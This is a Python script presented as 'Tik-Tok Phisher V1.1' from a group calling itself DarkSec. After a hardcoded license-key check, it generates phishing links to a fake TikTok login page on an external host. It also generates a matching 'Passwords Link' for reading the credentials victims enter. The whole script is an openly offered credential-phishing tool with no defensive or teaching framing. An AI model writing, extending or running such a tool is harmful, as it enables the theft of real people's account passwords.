
# -*- coding: UTF-8 -*-

#Colours Defined Variables

W  = '\033[1;37m'
N  = '\033[0m'
R="\033[1;37m\033[31m"
B  = '\033[1;37m\033[34m'
G  = '\033[1;32m'
Y = '\033[1;33;40m'

#Decorators
SBR = W+"("+R+"π"+W+")"
SBG = W+"("+G+"π"+W+")"
SRO = W+"("+R+">"+W+")"
SGO = W+"("+G+">"+W+")"

SEO = W+"("+R+"!"+W+")"

newlin = "\n"
#SBG = '\x1b[1;37m(\x1b[1;32m\xe2\x97\x8f\x1b[1;37m)'
#SBR = '\x1b[1;37m(\x1b[1;37m\x1b[31m\xe2\x97\x8f\x1b[1;37m)'



import os
from base64 import *
from random import choice as c
import time


banner = """
{}
┈┈┈╲┈┈┈┈╱
┈┈┈╱     ▔▔╲
┈┈┃┈▇┈┈▇┈┃    {} DarkSec Present's{}
╭╮┣━━━━━━┫╭╮
┃┃┃┈┈┈┈┈┈┃┃┃  {}Tik-Tok Phisher V1.1{}
╰╯┃┈┈┈┈┈┈┃╰╯  {}  By : Nasir Ali{}
┈┈╰┓┏━━┓┏╯     
┈┈┈╰╯┈┈╰╯

{}Youtube :{} youtube.com/TheDarkSec
{}Github : {}github.com/nasirxo
{}Facebook :{} facebook.com/nasir.xo

""".format(Y,R,Y,G,Y,G,Y,G,W,G,W,G,W)

os.system("clear")
print(banner)
i=0
key = "darksec47"
while i==0:
  try:
      #r = get("https://mbasic.facebook.com/nasir.xo")
      #data = BeautifulSoup(r.content,features="html.parser")
      #xD = data.find('span', attrs={'dir': 'ltr'})
      #key = xD.get_text().split()[0]
      ikey = input(SBR+" Enter License Key : ")
      if ikey == key:
       print(SGO+" Authorization Sucessfull ! ")
       time.sleep(3)
       while i==0:
         os.system('clear')
         time.sleep(2)
         print(banner)
         print("""
         {}     [Select-Option]
               
         {} (1) : Generate Phishing Link
         {} (2) : Exit 


         """.format(Y,SBG,SBG))
         op = input(SRO+" Option : ")
         n = list('abcdefghijklmnopqrstuvwxyz1234567890')
         if str(op) == '1':
            ID = ''.join([c(n) for x in range(5)])
            KE = b16encode(ID.encode("utf-8"))
            print("""
            {}     [ Link-Generated ]

{} ===================================================            
{} Phishing Link : 
    http://tik-tok.rf.gd/login.php?ID={}
{} Passwords Link : 
    http://tik-tok.rf.gd/pass.php?KEY={}

{} ===================================================
 
            """.format(G,Y,SGO,ID,SGO,KE.decode("utf-8"),Y))
            f = input()
         elif str(op) == '2':
            print(SBR+" BYE BYE !")
            i+=1
            quit()
                
         else:
            print(SEO+" Invalid Input ! ")
      print(SEO+" Invalid Key ! ")
  except:
     pass